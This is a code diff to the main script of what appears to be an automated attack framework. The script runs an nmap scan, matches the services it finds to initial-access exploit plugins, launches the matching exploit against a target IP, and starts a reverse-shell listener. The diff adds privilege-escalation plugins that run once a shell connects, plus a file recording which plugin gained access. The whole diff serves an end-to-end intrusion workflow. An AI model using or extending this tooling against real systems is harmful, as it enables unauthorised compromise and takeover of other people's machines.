@@ -7,11 +7,16 @@ import rs_client
 import sys
 import configparser
 import os
+import utils
 from plugins.initial_access import *
 import constants
+import privesc
 
 
-def read_plugins_configs():
+def read_plugins_configs() -> dict:
+    """
+    Read all the plugins config files
+    """
     config = configparser.ConfigParser()
     current_dir = os.path.dirname(os.path.abspath(__file__))
     initial_plugins_path = os.path.join(current_dir, constants.PLUGINS_DIR, constants.INITIAL_ACCESS_PLUGINS_DIR)
@@ -23,26 +28,51 @@ def read_plugins_configs():
                 'service' : config['DEFAULT']['service'],
                 'versions' : config['DEFAULT']['versions']
             }
-
     return configs
 
 
-def listener(listener_port, listener_address):
+def listener(listener_port: int, listener_address: str, compromission_recap_file_name: str) -> None:
+    """
+    Create a listener that waits for a connection from the reverse shell
+    """
     sys.stdin = open(0)
-    rs_client.main(listener_port, listener_address)
+    persistent = False
+    hosts = None
+    sock = None
+
+    if hosts:
+        hosts = hosts.split(",")
+
+    try:
+        sock = rs_client.Socket(listener_port, listener_address)
+        sock.listen(hosts)
+        shell = rs_client.Shell(sock, persistent)
+        privesc.load_all_plugins(sock, shell, compromission_recap_file_name)
+
+    except KeyboardInterrupt:
+        sock.close()
 
 
-def exploit(plugin_name, target_ip, target_port, local_ip, local_port):
+def run_initial_access_plugin(plugin_name: str, target_ip: str, target_port: int, local_ip: str, local_port: int, compromission_recap_file_name: str) -> None:
+    """
+    Run an initial access plugin
+    """
     try:
         print('[+] Running plugin {}'.format(plugin_name))
         res = eval(plugin_name).exploit(target_ip, target_port, local_ip, local_port)
         if res is True:
             print('[+] Exploit was successful !')
+            if compromission_recap_file_name:
+                with open(compromission_recap_file_name, 'w') as f:
+                    f.write('Plugin used for initial access : {}\n'.format(plugin_name))
     except Exception as e:
         print(e)
 
 
-def extract_ip():
+def extract_ip() -> None or str:
+    """
+    Return the local IP of the machine
+    """
     st = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     try:       
         st.connect(('10.255.255.255', 1))
@@ -63,12 +93,19 @@ if __name__ == '__main__':
     parser.add_argument('-t', '--target_ip', type=str, help='ip to target', required=True)
     parser.add_argument('-l', '--local_ip', type=str, help='local ip', required=False)
     parser.add_argument('-p', '--local_port', default=9001, type=int, help='local port', required=False)
+    parser.add_argument('-o', '--output', type=str, help='output file name', required=False)
     args = parser.parse_args()
+
 
     if args.local_ip == None:
         LOCAL_IP = extract_ip()
     else:
         LOCAL_IP = args.local_ip
+
+    # validate IP addresses' format
+    utils.validate_ip_address(args.target_ip)
+    utils.validate_ip_address(LOCAL_IP)
+    
     res_recon = recon.nmap_scan(args.target_ip)
 
     BUFFER_SIZE = 1024 * 128
@@ -79,9 +116,9 @@ if __name__ == '__main__':
         for plugin_name, values in configs.items():
             if i['product'] == values['service'] and i ['version'] in values['versions']:
                 target_port = i['port']
-                listener_process = Process(target=listener, args = (args.local_port, LOCAL_IP))
+                listener_process = Process(target=listener, args = (args.local_port, LOCAL_IP, args.output))
                 listener_process.start()
-                exploit_process = Process(target=exploit, args = (plugin_name, args.target_ip, target_port, LOCAL_IP, args.local_port))
+                exploit_process = Process(target=run_initial_access_plugin, args = (plugin_name, args.target_ip, target_port, LOCAL_IP, args.local_port, args.output))
                 exploit_process.start()
                 listener_process.join()
                 exploit_process.join()
